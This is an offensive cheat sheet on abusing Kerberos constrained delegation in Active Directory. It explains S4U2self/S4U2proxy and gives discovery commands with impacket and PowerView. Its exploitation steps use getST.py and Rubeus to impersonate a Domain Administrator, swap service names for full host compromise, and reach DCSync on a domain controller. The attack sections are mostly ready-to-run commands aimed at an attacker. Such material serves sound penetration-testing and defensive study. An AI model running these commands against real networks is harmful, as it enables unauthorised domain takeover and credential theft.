**Constrained delegation (KCD)** — some accounts are trusted to reach a fixed list of services *on your behalf*, and if you own such an account you can ride that trust to log into those services as anyone you like — including a Domain Admin. The allowed list lives in the account's `msDS-AllowedToDelegateTo` attribute (each entry is an SPN — a label that ties a service to an account), and the account requests the impersonated ticket via S4U2proxy, the Kerberos step that asks the KDC for a ticket to a target *on behalf of another user*. With **protocol transition** enabled you don't even need that user to have authenticated first: the account mints its own evidence ticket with S4U2self, then feeds it to S4U2proxy.

```
you (deleg acct) -> KDC: S4U2self, evidence tkt for Admin
KDC -> you: evidence ticket (as Admin)
you -> KDC: S4U2proxy + evidence tkt, service on TARGET
KDC -> you: service ticket to TARGET as Admin
you -> TARGET: authenticate as Admin
```

**Note:** Two flavours:
- **Without protocol transition** (`TrustedToAuthForDelegation` off) - the account can only forward a Kerberos ticket a user already presented. Harder to abuse standalone.
- **With protocol transition** (`TrustedToAuthForDelegation` on, "Use any authentication protocol") - the account can do S4U2self to mint its own evidence ticket for any user, then S4U2proxy to the target. This is the abusable case.

## Discovery

Impacket - lists accounts and what they can delegate to:

```bash

findDelegation.py 'DOMAIN/USER_NAME:USER_PASS'

```

```console

AccountName   AccountType  DelegationType              DelegationRightsTo
------------  -----------  --------------------------  --------------------------------
websvc        User         Constrained w/ Protocol T.  MSSQLSvc/SRV01.domain.local:1433
SRV02$        Computer     Constrained                 HOST/SRV01.domain.local

```

PowerView (Windows):

```powershell

Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

```

BloodHound: the `AllowedToDelegate` edge from the compromised principal to the target computer.

## Exploitation

You control an account (`DELEG_ACCOUNT`, user or computer) that has constrained delegation to an SPN on `TARGET`, and you know its NT hash / AES key / password.

### From Linux (impacket)

```bash

# Impersonate a domain admin to the allowed SPN
getST.py -spn 'CIFS/TARGET_FQDN' -impersonate 'Administrator' -hashes ':DELEG_ACCOUNT_NT_HASH' 'DOMAIN/DELEG_ACCOUNT'
export KRB5CCNAME=Administrator@CIFS_TARGET_FQDN.ccache

```

Then use the ticket - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

### From Windows (Rubeus)

```powershell

.\Rubeus.exe s4u /user:DELEG_ACCOUNT$ /rc4:DELEG_ACCOUNT_NT_HASH /impersonateuser:Administrator /msdsspn:CIFS/TARGET_FQDN /ptt

```

### Alternate-service trick

The service class in the requested SPN is not cryptographically bound in the resulting Service Ticket, so a single allowed SPN can be swapped for another service on the **same host** (e.g. delegation allowed to `TIME/TARGET`, but you request `CIFS/`, `HOST/`, `LDAP/`, `HTTP/` ...). This turns a low-value SPN into full host compromise (`CIFS/` for file/exec, `LDAP/` for DCSync on a DC).

```powershell

# Rubeus - request the allowed SPN but substitute a more useful service
.\Rubeus.exe s4u /user:DELEG_ACCOUNT$ /rc4:DELEG_ACCOUNT_NT_HASH /impersonateuser:Administrator /msdsspn:TIME/TARGET_FQDN /altservice:CIFS,HOST,LDAP /ptt

```

```bash

# impacket - -altservice does the same
getST.py -spn 'TIME/TARGET_FQDN' -altservice 'CIFS' -impersonate 'Administrator' -hashes ':DELEG_ACCOUNT_NT_HASH' 'DOMAIN/DELEG_ACCOUNT'

```

**Note:** `-impersonate` a user who is **not** marked "sensitive / cannot be delegated" and is not in the **Protected Users** group - S4U2proxy will refuse those.

## References

- impacket (getST.py) - https://github.com/fortra/impacket
- Rubeus - https://github.com/GhostPack/Rubeus
- The Hacker Recipes - Constrained delegation - https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained
- Elad Shamir - Wagging the Dog - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
